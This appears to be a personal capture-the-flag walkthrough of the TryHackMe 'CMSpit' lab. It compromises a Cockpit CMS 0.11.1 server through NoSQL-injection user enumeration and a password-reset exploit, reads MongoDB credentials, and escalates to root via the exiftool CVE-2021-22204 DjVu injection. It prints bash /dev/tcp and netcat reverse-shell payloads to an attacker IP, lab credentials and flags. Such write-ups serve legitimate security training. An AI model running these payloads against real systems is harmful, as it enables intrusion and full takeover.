@@ -1,0 +1,439 @@
+CMSPIT.
+
+
+
+
+[>>> TASK 1: READY SET GO]
+[1.1. WHAT IS THE NAME OF THE CONTENT MANAGEMENT SYSTEM (CMS) INSTALLED ON THE SERVER?]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.48.2
+[OUTPUT]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+[ACTION: explore http://10.10.48.2/auth/login?to=/]
+[OUTPUT]
+Cockpit
+Username 
+Password 
+Show
+Authenticate
+Forgot Password? 
+[ANSWER]
+cockpit
+
+
+
+[1.2. WHAT IS THE VERSION OF THE CONTENT MANAGEMENT SYSTEM (CMS) INSTALLED ON THE SERVER?]
+[ACTION: check source of http://10.10.48.2/auth/login?to=/]
+ctrl + u
+[OUTPUT (snippet)]
+    <link href="/assets/app/css/style.css?ver=0.11.1" type="text/css" rel="stylesheet">
+<script src="/storage/tmp/7a812eebe1eda3162d79b4109b4787d4.js?ver=0.11.1" type="text/javascript"></script>    <script src="/storage/tmp/4cc5a0d2487ec7f4c75b0cc9115bf601.js?ver=0.11.1" type="text/javascript"></script>
+[ANSWER]
+0.11.1
+
+
+
+[1.3. WHAT IS THE PATH THAT ALLOWS USER ENUMERATION?]
+[ACTION: explore http://10.10.48.2/auth/login?to=/]
+I clicked on the forgot password, and got redirected to http://10.10.48.2/auth/login
+There I found another a field asking for username or email.
+
+
+[ACTION: test username likely to exist]
+admin 
+[OUTPUT]
+Invalid address: (From): root@localhost
+
+
+[ACTION: test username unlikely to exist]
+a45gkfp435gidf
+[OUTPUT]
+User does not exist
+
+
+[NOTE] 
+After way too long of testing and looking around, realizing gobuster wouldn't work, I decided to research exploit for our found cms and its version in use.
+[ACTION: research cockpit 0.11.1 exploit]
+I found: https://www.exploit-db.com/exploits/50185
+And: https://github.com/0z09e/CVE-2020-35846
+However, I didn't manage to make those work. 
+I'll try the metasploit module referenced on https://www.rapid7.com/db/modules/exploit/multi/http/cockpit_cms_rce/
+
+
+[ACTION: run metasploit module]
+msfconsole
+set LHOST 10.23.25.109
+set RHOSTS 10.10.48.2
+run
+[OUTPUT]
+[*] Started reverse TCP handler on 10.23.25.109:4444 
+[*] Attempting Username Enumeration (CVE-2020-35846)
+[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
+[-] Exploit aborted due to failure: bad-config: 10.10.48.2:80 - User to exploit required
+[*] Exploit completed, but no session was created.
+[NOTE]
+Looks like metasploit doesn't mention the path that allows enum.
+Doing some research, I find out the nosql injection vuln is found in the api endpoint: /auth/check
+[ANSWER]
+/auth/check
+
+
+
+[1.4. HOW MANY USERS CAN YOU IDENTIFY WHEN YOU REPRODUCE THE USER ENUMERATION ATTACK?]
+[ANSWER (based on 1.3 output)]
+4
+
+
+
+[1.5. WHAT IS THE PATH THAT ALLOWS YOU TO CHANGE USER ACCOUNT PASSWORDS?]
+[ACTION: research how exploit works]
+After enum users via nosql payload in /auth/check, the exploit finds password reset tokens, and then sends post requests to /auth/resetpassword (to reset a user's password without knowing the old one).
+[ANSWER]
+/auth/resetpassword
+
+
+
+[1.6. COMPROMISE THE CONTENT MANAGEMENT SYSTEM (CMS). WHAT IS SKIDY'S EMAIL]
+[NOTE]
+Based on the output of the previous run of the exploit, we need to set a user.
+We will try admin.
+[ACTION: rerun module]
+set USER admin
+exploit
+[OUTPUT]
+*] Started reverse TCP handler on 10.23.25.109:4444 
+[*] Attempting Username Enumeration (CVE-2020-35846)
+[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
+[*] Obtaining reset tokens (CVE-2020-35847)
+[+]   Found tokens: ["rp-f803ab2511b50e455aaf75a74d9f9bfb68890726e2826"]
+[*] Checking token: rp-f803ab2511b50e455aaf75a74d9f9bfb68890726e2826
+[*] Obtaining user info
+[*]   user: admin
+[*]   name: Admin
+[*]   email: admin@yourdomain.de
+[*]   active: true
+[*]   group: admin
+[*]   password: $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
+[*]   i18n: en
+[*]   _created: 1621655201
+[*]   _modified: 1621655201
+[*]   _id: 60a87ea165343539ee000300
+[*]   _reset_token: rp-f803ab2511b50e455aaf75a74d9f9bfb68890726e2826
+[*]   md5email: a11eea8bf873a483db461bb169beccec
+[+] Changing password to cNl84cecVE
+[+] Password update successful
+[*] Attempting login
+[+] Valid cookie for admin: 8071dec2be26139e39a170762581c00f=v3akjn818271lgoe4i8n2t6e8l;
+[*] Attempting RCE
+[*] Sending stage (40004 bytes) to 10.10.48.2
+[*] Meterpreter session 1 opened (10.23.25.109:4444 -> 10.10.48.2:48084) at 2025-07-29 20:02:06 +0200
+[NOTE]
+This means we can log in with creds admin|cNl84cecVE
+
+
+[ACTION: login to admin with reset password, and explore]
+We land on the cockpit dashboard.
+We are asked to find Skidy's email, so I go straight to the search bar to look for said user.
+[OUTPUT]
+Name 
+Skidy
+Username 
+skidy
+Email 
+skidy@tryhackme.fakemail
+[ANSWER]
+skidy@tryhackme.fakemail
+
+
+
+[1.7. WHAT IS THE WEB FLAG?]
+[ACTION: search for web flag]
+It wasn't displayed on login, so that probably means its written inside some file. 
+After searching a bit, I find http://10.10.48.2/finder, where a file webflag.php is listed.
+[OUTPUT]
+<?php
+        $flag = "thm{f158bea70731c48b05657a02aaf955626d78e9fb}";
+?>
+[ANSWER]
+thm{f158bea70731c48b05657a02aaf955626d78e9fb}
+
+
+
+[1.8. COMPROMISE THE MACHINE AND ENUMERATE COLLECTIONS IN THE DOCUMENT DATABASE INSTALLED IN THE SERVER. WHAT IS THE FLAG IN THE DATABASE?]
+[NOTE]
+Reminder we had a meterpreter session open.
+[ACTION: spawn shell]
+shell
+
+
+[ACTION: stabilize shell]
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+
+[NOTE]
+We are at cockpit, so the document database is probably around here.
+[ACTION: list directory content]
+ls
+[OUTPUT]
+CONTRIBUTING.md  addons		cp	     lib	   webflag.php
+Dockerfile	 assets		favicon.png  modules
+LICENSE		 bootstrap.php	index.php    package.json
+README.md	 composer.json	install      storage
+
+
+[ACTION: search for database]
+cd storage
+cd data
+ls
+[OUTPUT]
+cockpit.memory.sqlite  cockpit.sqlite  cockpitdb.sqlite  index.html
+
+
+[ACTION: search cockpit.sqlite]
+sqlite3 cockpit.sqlite
+[OUTPUT]
+sqlite3 cockpit.sqlite
+The program 'sqlite3' is currently not installed. To run 'sqlite3' please ask your administrator to install the package 'sqlite3'
+
+
+[NOTE]
+I spent some time researching manually, but found nothing.
+[ACTION: check if database is mongo]
+mongo
+[OUTPUT]
+MongoDB shell version: 2.6.10
+connecting to: test
+Welcome to the MongoDB shell.
+For interactive help, type "help".
+For more comprehensive documentation, see
+	http://docs.mongodb.org/
+Questions? Try the support group
+	http://groups.google.com/group/mongodb-user
+2025-07-29T11:49:55.926-0700 In File::open(), ::open for '' failed with errno:2 No such file or directory
+
+
+[ACTION: list databases]
+show dbs
+[OUTPUT]
+admin         (empty)
+local         0.078GB
+sudousersbak  0.078GB
+
+
+[ACTION: list local contents]
+use local
+show collections
+[OUTPUT]
+startup_log
+system.indexes
+
+
+[ACTION: list sudousersbak contents]
+use sudousersbak
+show collections
+[OUTPUT]
+flag
+system.indexes
+user
+
+
+[ACTION: display flag]
+db.flag.find().pretty()
+[OUTPUT]
+{
+	"_id" : ObjectId("60a89f3aaadffb0ea68915fb"),
+	"name" : "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}"
+}
+[ANSWER]
+thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}
+
+
+[NOTE]
+The clue says there is other useful info around.
+Also, user is screaming for us to check it out.
+[ACTION: display user]
+db.user.find().pretty()
+[OUTPUT]
+{
+	"_id" : ObjectId("60a89d0caadffb0ea68915f9"),
+	"name" : "p4ssw0rdhack3d!123"
+}
+{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
+[NOTE]
+Looks like we got a cred pair stux|p4ssw0rdhack3d!123
+[ANSWER]
+thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}
+
+
+
+
+[1.9. WHAT IS THE USER.TXT FLAG?]
+[ACTION: end mongodb shell session]
+exit
+
+
+[ACTION: search for user flag]
+find / -name "user.txt" 2>/dev/null
+[OUTPUT]
+/home/stux/user.txt
+
+
+[ACTION: display user flag]
+cat /home/stux/user.txt
+[OUTPUT]
+cat: /home/stux/user.txt: Permission denied
+
+
+[NOTE]
+Looks like this is were our found creds come in handy.
+[ACTION: log in as stux]
+su stux
+
+
+[ACTION: display user flag]
+cat /home/stux/user.txt
+[OUTPUT]
+thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}
+
+
+
+[1.10. WHAT IS THE CVE NUMBER FOR THE VULNERABILITY AFFECTING THE BINARY ASSIGNED TO THE SYSTEM USER? ANSWER FORMAT: CVE-0000-0000]
+[ACTION: display suid binaries]
+find / -perm -4000 -type f 2>/dev/null
+[NOTE]
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/vmware-user-suid-wrapper
+/bin/su
+/bin/mount
+/bin/ping6
+/bin/fusermount
+/bin/umount
+/bin/ping
+
+
+[NOTE]
+vmware-user-suid-wrapper -> CVE-2023-34059
+fusermount -> cve-2015-3202
+umount -> cve-2000-0218
+dbus-daemon-launcher-helper -> cve-2012-3524
+I just realized these aren't what the question wanted..
+[ACTION: check user sudo permissions]
+sudo -l
+[OUTPUT]
+Matching Defaults entries for stux on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User stux may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/local/bin/exiftool
+
+
+[ACTION: check exiftool version]
+exiftool -ver
+[OUTPUT]
+12.05
+
+
+[ACTION: research privesc exploits for exiftool v12.05]
+[OUTPUT]
+I found:
+https://www.exploit-db.com/exploits/50911
+https://github.com/UNICORDev/exploit-CVE-2021-22204
+CVE-2021-22204
+[ANSWER]
+cve-2021-22204
+
+
+[1.10. WHAT IS THE UTILITY USED TO CREATE THE POC FILE?]
+[NOTE]
+Code snippet from https://www.exploit-db.com/exploits/50911:
+    # Run djvumake
+    subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
+[ANSWER]
+djvumake
+
+
+[1.11. ESCALATE YOUR PRIVILEGES. WHAT IS THE FLAG IN ROOT.TXT?]
+[NOTE]
+I saved the exploit as exif_exploit.py
+[ACTION: start python server]
+python3 -m http.server 8000
+
+
+[ACTION: download to machine (ran in /tmp)]
+curl http://10.23.25.109:8000/exif_exploit.py -O
+
+
+[NOTE]
+After attempting to run the script, I got some errors based on the syntax.
+I will try to exploit via the metasploit module.
+Also, new ip due to machine reboot: 10.10.127.3
+Connected to machine via ssh stux@10.10.127.3 (to avoid redoing exploit).
+[ACTION: setup and run metasploit module]
+msfconsole
+exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
+set LHOST 10.23.25.109
+set DisablePayloadHandler False
+set FILENAME exif_exploit.jpg
+run
+[OUTPUT]
+[*] Started reverse TCP handler on 10.23.25.109:4444 
+[+] exif_exploit.jpg stored at /home/user0/.msf4/local/exif_exploit.jpg
+[*] Exploit completed, but no session was created.
+
+
+[ACTION: setup python http server]
+cd /home/user0/.msf4/local
+python3 -m http.server 8000
+
+
+[ACTION: curl (as stux)]
+wget http://10.23.25.109:8000/exif_exploit.jpg
+
+
+[ACTION: run exploit]
+exiftool exif_exploit.jpg
+
+
+[NOTE]
+ I fail to privesc after running exiftool. I'll follow the poc. 
+[ACTION: create and serve payload] 
+echo "print \`/bin/bash -c 'bash -i >& /dev/tcp/10.23.25.109/4444 0>&1'\`;" > payload.bzz 
+djvumake exploit.djvu INFO=1,1 BGjp=/dev/null ANTz=payload.bzz 
+python3 -m http.server 8000
+nc -lnvp 4444
+
+
+[ACTION: get and run exploit]
+wget http://10.23.25.109:8000/exploit.djvu
+sudo /usr/local/bin/exiftool exploit.djvu
+
+
+[NOTE]
+I catch no shell, so retry.
+[ACTION: exploit]
+echo "print qx(nc 10.23.25.109 4444 -e /bin/bash);" > payload.bzz
+djvumake exploit.djvu INFO=1,1 BGjp=/dev/null ANTz=payload.bzz
+python3 -m http.server 8000
+wget http://10.23.25.109:8000/exploit.djvu -O exploit2.djvu
+nc -lnvp 4444
+
+
+[ACTION: check flag]
+cat /root/root.txt
+[OUTPUT]
+thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}
